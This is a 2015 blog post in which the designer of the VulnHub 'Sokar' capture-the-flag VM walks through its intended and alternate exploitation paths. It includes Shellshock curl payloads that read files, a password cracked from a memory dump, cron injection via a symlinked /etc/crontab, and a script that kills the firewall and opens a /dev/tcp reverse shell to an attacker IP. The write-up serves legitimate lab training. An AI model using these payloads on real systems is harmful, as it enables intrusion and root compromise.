@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Sokar: Author&#39;s Narrative - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-02-21">February 21, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/guff">guff</a>
+
+    </span>
+
+
+  </div>
+  <h1 class="headline" itemprop="headline">Sokar: Author&#39;s Narrative</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>At the very moment I am typing this, ~4 hours remain on the countdown clock for <a href="http://blog.vulnhub.com/2015/01/competition-sokar.html">VulnHub&rsquo;s Sokar Competition</a>.  We have also received about 17 complete write-ups, which I&rsquo;m really pleased with.</p>
+
+<p>Now, Sokar was never originally designed to be released on VulnHub, let alone feature as a birthday competition.  So this post serves to outline Sokar&rsquo;s origin story, the intended exploitation path and anything else I can think to talk about.</p>
+
+<h2 id="origin:e5cf719596ab6a87a7d7e8601fcbad2c">Origin</h2>
+
+<p>On September 24th, the <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">Shellshock</a> vulnerability was disclosed, which understandably, caused a raft of emergency response across businesses.  After we had carried out the necessary patching across our cloud platform, we wanted to go back over all of the server logs to ensure we had not been attacked prior to disclosure.</p>
+
+<p>The VM which ultimately became Sokar, was solely design to analyse Shellshock from a protective monitoring point of view.</p>
+
+<p>It was originally handed over to <a href="https://twitter.com/barrebas">barrebas</a>, to see what he could make of Shellshock with a restrictive firewall.  The original scenario was to steal data from a MySQL database and to analyse the local log files to identify the attack.</p>
+
+<p>I suppose he found the experience devilsh enough to suggest I make it available on VulnHub&hellip;</p>
+
+<h2 id="the-birthday:e5cf719596ab6a87a7d7e8601fcbad2c">The Birthday</h2>
+
+<p>I was in no rush to get Sokar (still lacking it&rsquo;s official name) ready for release on VulnHub, but word that I had a VM &lsquo;in development&rsquo; made it to <a href="https://twitter.com/g0tmi1k">g0tmi1k&rsquo;s</a> ears.  He asked if I would like to use this VM as VulnHub&rsquo;s birthday competition.</p>
+
+<p>Of course, I said yes!  But I had a lot of work to do to make to ready, as there wasn&rsquo;t a great deal of time to go.  Considering I had to build it, and get it through a cycle of beta-testing etc.</p>
+
+<p>Barrebas was obviously first in the firing line for beta-testing, after all, this was his fault ;).  <a href="https://twitter.com/thecolonial">TheColonial</a> also gracefully stepped up to the plate.</p>
+
+<h2 id="walkthrough:e5cf719596ab6a87a7d7e8601fcbad2c">Walkthrough</h2>
+
+<p>As you will see from the write-ups, there are a bunch of different solutions to Sokar - every stage has an alternate method of exploitation.  Here is my summary of how I designed Sokar to be beaten, and a few words on the alternates.</p>
+
+<h3 id="shellshock:e5cf719596ab6a87a7d7e8601fcbad2c">Shellshock</h3>
+
+<p>I kept Shellshock as the initial exploitation point, which allowed interaction with the local filesystem.  Using this access, the attacker will find the following information:</p>
+
+<ul>
+<li>Bynarr&rsquo;s home directory is world-writable.</li>
+</ul>
+
+<pre><code class="language-text">root@kali:~# curl -A '() { :;}; echo -en &quot;\r\n\r\n$(/bin/ls -l /home)\r\n\r\n&quot;' 192.168.127.105:591/cgi-bin/cat
+drwxrwxrwx. 2 bynarr  bynarr  4096 Feb 17 17:26 bynarr
+</code></pre>
+
+<ul>
+<li>Bynarr has his home directory at the front of his PATH.</li>
+</ul>
+
+<pre><code class="language-text">root@kali:~# curl -A '() { :;}; echo -en &quot;\r\n\r\n$(/bin/cat /home/bynarr/.bash_profile)\r\n\r\n&quot;' 192.168.127.105:591/cgi-bin/cat
+
+# User specific environment and startup programs
+
+PATH=.:$PATH:$HOME/bin
+export PATH
+</code></pre>
+
+<ul>
+<li>Bynarr owns <code>/tmp/stats</code>, which is updated every minute.  The logical inference is that a cronjob is running.</li>
+</ul>
+
+<pre><code class="language-text">root@kali:~# curl -A '() { :;}; echo -en &quot;\r\n\r\n$(/bin/ls -l /tmp/)\r\n\r\n&quot;' 192.168.127.105:591/cgi-bin/cat
+-rw-rw-r-- 1 bynarr  bynarr        951 Feb 21 15:14 stats
+</code></pre>
+
+<ul>
+<li>The contents of <code>/tmp/stats</code> is generated using <code>date</code>, <code>uptime</code>, <code>netstat</code> and <code>iostat</code>.</li>
+</ul>
+
+<p>Writing a binary called <code>iostat</code> into <code>/home/bynarr</code> will get executed when the cron is run (the <code>iostat</code> path is not hardcoded in the job).</p>
+
+<p>The final hurdle is the outbound firewall rules.  Those who tried to initiate a reverse shell will have been unsuccessful - the <code>apache</code> user is restricted to the following rules:</p>
+
+<pre><code class="language-text">-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
+-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
+</code></pre>
+
+<ul>
+<li>There is a world-readable email from root to bynarr.</li>
+</ul>
+
+<pre><code class="language-text">root@kali:~# curl -A '() { :;}; echo -en &quot;\r\n\r\n$(/bin/ls -l /var/spool/mail)\r\n\r\n&quot;' 192.168.127.105:591/cgi-bin/cat
+-rw-rw-r--. 1 bynarr  mail 551 Dec 30 21:09 bynarr
+
+root@kali:~# curl -A '() { :;}; echo -en &quot;\r\n\r\n$(/bin/cat /var/spool/mail/bynarr)\r\n\r\n&quot;' 192.168.127.105:591/cgi-bin/cat
+...
+Password 'fruity'.
+...
+outbound ephemeral port access on 51242
+</code></pre>
+
+<p>This outgoing port is made possible by the following firewall rule:</p>
+
+<pre><code class="language-text">-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
+</code></pre>
+
+<p>So, a reverse shell as bynarr on port 51242 is possible using this method.  However as some of you know, there were ways around this restriction.</p>
+
+<ol>
+<li>Because bynarr&rsquo;s password was available in the email, an elaborate <code>su</code> could be done using a <code>python pty</code> import.  This allowed execution as bynarr, but it didn&rsquo;t really make it any easier to get a shell out of the system.</li>
+<li>IPv6 was left enabled on the system, but no firewall rules were applied.  This means that there were no restrictions on incoming/outgoing connections on IPv6.  For those who realised this, a <code>netcat</code> reverse shell was very easy.  A <code>python pty</code> import and a <code>su</code> to bynarr was probably the easiest method of getting a shell.</li>
+</ol>
+
+<p>Keeping IPv6 enabled was a slip-up on my part.  But it sure as hell goes to show what a risk it can be if left running and not managed correctly.  Finally, Shellshock also allowed for some other attacks, which took you straight to root - most notable being against DHCP.</p>
+
+<h3 id="lime:e5cf719596ab6a87a7d7e8601fcbad2c">LiME</h3>
+
+<p>The next step was to perform a memory dump, using the LiME kernel module.  I wrote a bash wrapper around this, as it was easier to integrate it into <code>sudo</code>.</p>
+
+<pre><code class="language-text">[bynarr@sokar ~]$ sudo -l
+
+User bynarr may run the following commands on this host:
+    (ALL) NOPASSWD: /home/bynarr/lime
+</code></pre>
+
+<p>I think everybody get through this part as intended - that is to perform a memory dump and extract the password hash for apophis.  It was a weak password that could be cracked using <code>john</code> in just a few minutes.</p>
+
+<pre><code class="language-text">[bynarr@sokar ~]$ strings /tmp/ram | grep 'apophis'
+apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
+
+root@kali:~# john apophis --wordlist=/usr/share/wordlists/rockyou.txt 
+Loaded 1 password hash (sha512crypt [64/64])
+overdrive        (apophis)
+</code></pre>
+
+<p>There is an alternate solution which allows elevation to root - credit for this totally goes to TheColonial.</p>
+
+<ul>
+<li>Create a symlink from <code>/tmp/ram</code> to <code>/etc/crontab</code>.</li>
+</ul>
+
+<pre><code class="language-text">[bynarr@sokar ~]$ ln -s /etc/crontab /tmp/ram
+
+</code></pre>
+
+<ul>
+<li>This little python script will attempted to hold a string in memory.</li>
+</ul>
+
+<pre><code class="language-text">[bynarr@sokar ~]$ cat cron.py
+print &quot;* * * * * root /bin/bash /home/bynarr/boom&quot;
+raw_input()
+</code></pre>
+
+<ul>
+<li><code>boom</code> itself, is a shell script to do &lsquo;something&rsquo;.  In my example, it will kill the firewall and return a new shell.</li>
+</ul>
+
+<pre><code class="language-text">[bynarr@sokar ~]$ cat boom
+/etc/init.d/iptables stop
+/bin/bash -i &gt;&amp; /dev/tcp/192.168.127.101/4444 0&gt;&amp;1
+</code></pre>
+
+<p>Running <code>lime</code> will now dump the content of RAM straight into <code>/etc/crontab</code>.  Thankfully, it is rather forgiving and will ignore everything which doesn&rsquo;t match the correct syntax.  But with any luck, the injected string will end up in there and executed.</p>
+
+<pre><code class="language-text">root@kali:~# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.127.101] from (UNKNOWN) [192.168.127.105] 34026
+bash-4.1# /usr/bin/id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>The sad part about this, is that OJ warned me it was possible in the previous implementation of LiME.  Originally, I had the following contents in <code>/etc/sudoers</code>.</p>
+
+<pre><code class="language-text">%forensic   ALL=(ALL)    NOPASSWD: /sbin/insmod /home/bynarr/lime.ko *; /sbin/rmmod lime
+</code></pre>
+
+<p>The output path and format was wildcarded for the attacker to chose and OJ was able to specify <code>/etc/crontab</code> directly.  I had been careful to make <code>lime.ko</code> immutable so it couldn&rsquo;t be replaced with a different module, and I wrote the bash wrapper to hardcode the paths (and make it a little more user-friendly).  But I failed to take into consideration the symlink method.</p>
+
+<p>To fix the problem properly, I should have hardcoded the path to something like <code>/home/bynarr/ram</code> and <code>touch /home/bynarr/ram</code> as root (also ensuring another user could not move it etc).</p>
+
+<h3 id="git:e5cf719596ab6a87a7d7e8601fcbad2c">Git</h3>
+
+<p>This <code>build</code> binary contains an encrypted (XOR&rsquo;d) string, which is decrypted at runtime and passed to <code>system()</code>.  The command initiates a <code>git clone</code> over SSH.</p>
+
+<pre><code class="language-text">[apophis@sokar ~]$ ls -l
+-rwsr-sr-x 1 root root 8430 Jan  2 17:49 build
+</code></pre>
+
+<p>There is also a BOF written into the <code>Y/N</code> input field, but this was more of a red herring - there are a lot of protections in place to make exploitation rather difficult.  The intended path was to hijack the DNS of sokar and clone an evil repo.  The running version of git is vulnerable to malicious git tree&rsquo;s on case insensitive filesystems.</p>
+
+<pre><code class="language-text">[apophis@sokar ~]$ git --version
+git version 2.2.0
+[apophis@sokar ~]$ mount
+/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
+</code></pre>
+
+<p>A post-checkout script will run as root, allowing you to kill the firewall and get a shell back for example.</p>
+
+<p>The simplicity of making <code>/etc/resolv.conf</code> world-writable was a bit of a fudge.  I was originally planning on requiring an attacker to properly MiTM the VM, but I realised that would involve a significant alteration in people&rsquo;s environment.  For example, my VBox internal-host network has no default gateway, so I&rsquo;m not sure how a MiTM attack like ARP Spoofing would be achieved.</p>
+
+<p>The other, slightly easier route, is to take advantage of the git environmental variables, such as <code>GIT_SSH</code>.  Export the variable to point at your own shell script, causes this to be run instead of the real ssh, also as root.</p>
+
+<h2 id="conclusions:e5cf719596ab6a87a7d7e8601fcbad2c">Conclusions</h2>
+
+<p>It seems Sokar received mostly positive comments, I realise some may have been disappointed with a VM loaded with published vulnerabilities.</p>
+
+<p>If you have any comments or thoughts to add, please do so people.  Or get in touch with myself or VulnHub on Twitter, IRC or the world wide web.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
